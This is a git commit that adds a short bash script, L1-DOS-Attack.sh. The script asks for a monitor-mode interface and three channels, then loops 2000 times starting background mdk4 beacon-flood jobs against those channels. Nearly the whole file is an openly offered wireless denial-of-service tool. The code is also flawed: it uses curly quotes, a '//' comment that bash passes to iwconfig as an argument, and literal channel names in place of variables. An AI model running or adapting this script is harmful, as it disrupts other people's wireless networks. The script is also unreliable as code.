6f2efff999b4f650f7b76bc1cde95fd94b6770f1
Ibars Joel <35426719+Ibarsjoel1234@users.noreply.github.com>
2024-01-05 03:01:53 -0500

    Create L1-DOS-Attack.sh

---
+++ L1-DOS-Attack.sh
@@ -0,0 +1,12 @@
+#! /bin/bash
+read -p “Enter interface (monitor mode) you wise to use for the attack:” interface
+read -p “Enter channel you wish to attack:” channel1
+read -p “Enter channel you wish to attack:” channel2
+read -p “Enter channel you wish to attack:” channel3
+iwconfig $interface channel $channel1 // this is additional
+for count in $(seq 1 2000)
+do
+(mdk4 $interface b -c channel1> /dev/null)&
+(mdk4 $interface b -c channel2> /dev/null)&
+(mdk4 $interface b -c channel3> /dev/null)&
+done
